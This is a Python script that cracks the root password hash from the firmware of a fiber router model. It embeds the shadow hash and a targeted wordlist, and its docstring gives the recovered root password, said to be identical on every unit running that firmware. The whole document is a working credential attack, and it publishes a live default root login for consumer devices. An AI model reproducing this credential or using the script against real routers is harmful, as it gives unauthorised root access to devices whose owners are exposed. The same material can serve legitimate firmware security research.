#!/usr/bin/env python3
"""Offline crack of the LG6151M /etc/shadow root hash (firmware constant,
identical on every RP0102 unit). Requires: pip install passlib.

Result: root / F1ber@dm!n  (SHA-512 crypt $6$; note musl login/su cannot even
verify $6$ hashes, which is why this password "never works" via telnet/su).
"""
from passlib.hash import sha512_crypt

# From /etc/shadow of firmware RP0102 (also inside the squashfs image):
HASH = "$6$uXvf3aBJEpS7sdq0$cBeFd5CPbb5fcokmaJOWCprk/Cr0ItcboF4gx9qogusQyqz7JyzJ/3MysiYkoVK8Q6/alWTrHFztm2zig.VTG1"
MACS = []  # optionally add your MAC-derived variants from device_local.py

bases = [
    "F1ber@dm!n", "f1ber@dm!n", "F1ber$dm", "F1ber@dm", "f1ber$dm",
    "Fh@", "FH@", "fh@", "hg2x0",
    "F1berh0me", "Fiberhome", "fiberhome", "FiberHome",
    "Fh@dm!n", "f1ber@dm", "Fh$dm", "F1berHome",
    "admin", "root", "password",
]
cands = set(bases)
for b in bases:
    for m in MACS:
        cands.update({b + m, b + m.lower(), b + "@" + m})

for c in sorted(cands):
    if sha512_crypt.verify(c, HASH):
        print("FOUND root password:", repr(c))
        break
else:
    print("not found in targeted list")
